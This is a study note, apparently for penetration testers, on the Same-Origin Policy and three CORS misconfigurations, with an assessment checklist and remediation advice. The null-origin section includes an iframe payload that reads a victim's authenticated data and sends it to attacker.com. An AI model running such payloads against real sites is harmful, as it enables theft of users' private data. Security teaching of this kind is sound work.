# Cross-Origin Resource Sharing (CORS) & Same-Origin Policy (SOP)

## Overview

The **Same-Origin Policy (SOP)** is a foundational browser security control that restricts how scripts running on one origin can interact with resources on another origin. An origin is defined by:

```text
Scheme + Hostname + Port
```

For example, `https://example.com:443` and `http://example.com:80` are different origins due to protocol differences; `https://example.com:443` and `https://example.com:8080` differ by port.

**Cross-Origin Resource Sharing (CORS)** is a server-controlled mechanism that allows a server to relax SOP restrictions by explicitly informing the client browser which origins are permitted to access its responses.

```text
SOP  ──► Browser default cross-origin restriction (blocks client-side response reading)
CORS ──► Server-controlled exception allowing specific origins to access the response
```

---

## Key Lesson

> **CORS does not stop the server from receiving or processing a cross-origin request. It controls whether browser JavaScript is allowed to read and access the response.**

This distinction is critical:
```text
Request reaches server ≠ Browser JavaScript can read response
```

During penetration testing and security assessments, evaluate CORS by checking:

1. **What origin the application accepts:** Does it echo arbitrary origins, test regex patterns, or accept `null`?
2. **Whether `Access-Control-Allow-Origin` reflects attacker-controlled input.**
3. **Whether credentials are allowed:** Is `Access-Control-Allow-Credentials: true` enabled?
4. **Whether origin validation uses unsafe regex or substring matching:** Can attacker domains like `victim.com.attacker.com` or `attacker-victim.com` bypass validation?
5. **Whether `null` is trusted:** Does the application permit the `null` origin?
6. **Whether the exposed response contains sensitive information:** Does the endpoint return PII, authenticated tokens, or internal state?

### Exploitation Flow

```text
Attacker Origin ──► Cross-Origin Request ──► Misconfigured CORS ──► Browser exposes Response ──► Data Exfiltration
```

---

## The Three Core CORS Misconfigurations

Keeping these three vulnerability patterns distinct is essential for clear technical reporting and interview discussions:

```text
CORS Misconfigurations
├── 1. Arbitrary Origin Reflection (Echoing HTTP_ORIGIN)
├── 2. Substring / Bad Regex Validation (Overly permissive pattern matching)
└── 3. Explicit Null Origin Trust (Allowing sandboxed iframe / data: URI origins)
```

### 1. Arbitrary Origin Reflection
The application dynamically echoes whatever origin is sent in the `Origin` header directly into `Access-Control-Allow-Origin` without validation:
* **Server Response:**
  ```http
  Access-Control-Allow-Origin: https://attacker.com
  Access-Control-Allow-Credentials: true
  ```
* **Impact:** Any malicious website can initiate an authenticated request (via browser cookies/credentials) and directly read the victim's sensitive response.

### 2. Substring / Bad Regex Origin Validation
The server attempts to validate origins using flawed regular expressions or simple substring checks (e.g., checking if the origin contains `victim.com`):
* **Flawed Regex:** `/victim\.com/` or `origin.indexOf("victim.com") !== -1`
* **Attacker Bypass:**
  - Subdomain abuse: `https://victim.com.attacker.com`
  - Prefix/suffix domain abuse: `https://attackervictim.com`
* **Impact:** The server verifies the substring, treats the attacker domain as trusted, and reflects it in `ACAO` with `ACAC: true`.

### 3. Explicit `null` Origin Trust
The server explicitly trusts the `null` origin:
* **Server Response:**
  ```http
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  ```
* **Attack Mechanism:** Browsers emit `Origin: null` in specific scenarios, such as requests from `data:` URIs, local files (`file://`), or sandboxed `<iframe>` tags:
  ```html
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://victim.com/api/user/data', true);
    xhr.withCredentials = true;
    xhr.onload = function() {
      fetch('https://attacker.com/log?d=' + encodeURIComponent(xhr.responseText));
    };
    xhr.send();
  </script>"></iframe>
  ```

---

## Key CORS Headers

| Header | Direction | Purpose |
| :--- | :--- | :--- |
| `Origin` | Request | Indicates the origin initiating the cross-origin request. |
| `Access-Control-Allow-Origin` (ACAO) | Response | Specifies which origins are permitted to access the response (`*` or explicit origin). |
| `Access-Control-Allow-Credentials` (ACAC) | Response | Indicates whether the browser can expose the response when cookies or HTTP auth headers are sent. Cannot be used with `ACAO: *`. |
| `Access-Control-Allow-Methods` | Response | Lists HTTP methods permitted for the cross-origin resource. |
| `Access-Control-Allow-Headers` | Response | Lists request headers allowed in actual requests. |
| `Access-Control-Max-Age` | Response | Specifies how long preflight `OPTIONS` results can be cached. |

---

## Practical Assessment Checklist

```text
[ ] Identify sensitive endpoints returning authenticated personal/financial/session data
[ ] Send request with Origin: https://attacker.com and check if Origin is reflected in ACAO
[ ] Verify if Access-Control-Allow-Credentials: true is returned
[ ] Send request with Origin: null and inspect ACAO response
[ ] Test regex prefix/suffix bypasses (Origin: https://trusted.example.attacker.com)
[ ] Test preflight OPTIONS request behavior for custom headers/methods
[ ] Verify whether the browser allows client-side JavaScript to read the response payload
[ ] Construct automated proof-of-concept exfiltration script targeting receiver endpoint
```

---

## Defense & Remediation

1. **Strict Allowlist Verification:** Validate incoming `Origin` headers against a strictly defined, server-side whitelist of trusted domains. Never reflect arbitrary `Origin` headers.
2. **Anchor Regular Expressions:** If regex matching is used, strictly anchor the beginning and end of the hostname (e.g., `^https:\/\/([a-z0-9-]+\.)*victim\.com$`).
3. **Never Trust `null`:** Do not include `null` in the list of trusted origins; it can be forged using sandboxed iframes or data URLs.
4. **Avoid `Access-Control-Allow-Credentials: true` with Permissive Origins:** Only enable credential sharing for fully authenticated, explicitly trusted origins.
5. **Protect Sensitive Endpoints:** For sensitive data, rely on defense-in-depth: combine strict CORS with CSRF tokens and `SameSite=Lax` or `SameSite=Strict` cookies.
